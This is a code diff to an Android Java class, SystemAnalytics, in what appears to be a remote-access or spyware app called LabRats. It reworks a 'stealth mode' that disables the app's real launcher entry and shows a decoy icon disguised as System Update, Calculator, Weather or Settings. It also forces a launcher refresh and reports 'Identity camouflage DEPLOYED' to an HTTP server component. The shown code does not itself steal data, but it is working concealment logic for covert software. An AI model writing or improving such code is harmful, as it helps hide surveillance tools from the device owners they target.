@@ -149,38 +149,60 @@ public class SystemAnalytics {
      */
     public static void setStealthMode(android.content.Context context, boolean stealth) {
         try {
+            android.util.Log.d("SystemAnalytics", "Executing stealth protocol. Active: " + stealth);
             android.content.pm.PackageManager pm = context.getPackageManager();
             android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
             
             // Resolve chosen Decoy from BuildConfig
             String decoyClass = "com.labs.labrats.SystemUpdateAlias";
-            switch (BuildConfig.DECOY_CHOICE) {
-                case 2: decoyClass = "com.labs.labrats.CalculatorAlias"; break;
-                case 3: decoyClass = "com.labs.labrats.WeatherAlias"; break;
-                case 4: decoyClass = "com.labs.labrats.SettingsAlias"; break;
-            }
+            try {
+                switch (BuildConfig.DECOY_CHOICE) {
+                    case 2: decoyClass = "com.labs.labrats.CalculatorAlias"; break;
+                    case 3: decoyClass = "com.labs.labrats.WeatherAlias"; break;
+                    case 4: decoyClass = "com.labs.labrats.SettingsAlias"; break;
+                }
+            } catch (Exception ignored) {}
+            
             android.content.ComponentName decoy = new android.content.ComponentName(context, decoyClass);
 
             if (stealth) {
-                if (pm.getComponentEnabledSetting(main) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
-                    return; 
-                }
-                pm.setComponentEnabledSetting(decoy, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                // Disable Main
                 pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                LabRatsHttpServer.logActivity("STEALTH_SHIELD: Identity camouflage DEPLOYED");
                 
+                // Disable ALL other decoys first to ensure only one is active
+                String[] decoys = {"com.labs.labrats.SystemUpdateAlias", "com.labs.labrats.CalculatorAlias", "com.labs.labrats.WeatherAlias", "com.labs.labrats.SettingsAlias"};
+                for (String d : decoys) {
+                    if (!d.equals(decoyClass)) {
+                        pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                    }
+                }
+
+                // Enable chosen decoy
+                pm.setComponentEnabledSetting(decoy, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                
+                LabRatsHttpServer.logActivity("STEALTH_SHIELD: Identity camouflage DEPLOYED (" + decoyClass + ")");
+                
+                // Force Launcher Refresh
                 android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
                 home.addCategory(android.content.Intent.CATEGORY_HOME);
                 home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                 context.startActivity(home);
             } else {
+                // Restore Main
                 pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                // Disable all possible decoys to be safe
+                
+                // Disable all possible decoys
                 String[] decoys = {"com.labs.labrats.SystemUpdateAlias", "com.labs.labrats.CalculatorAlias", "com.labs.labrats.WeatherAlias", "com.labs.labrats.SettingsAlias"};
                 for (String d : decoys) {
                     pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 }
                 LabRatsHttpServer.logActivity("STEALTH_SHIELD: Identity camouflage RELEASED");
+                
+                // Force Launcher Refresh
+                android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
+                home.addCategory(android.content.Intent.CATEGORY_HOME);
+                home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(home);
             }
         } catch (Exception e) {
             android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage());
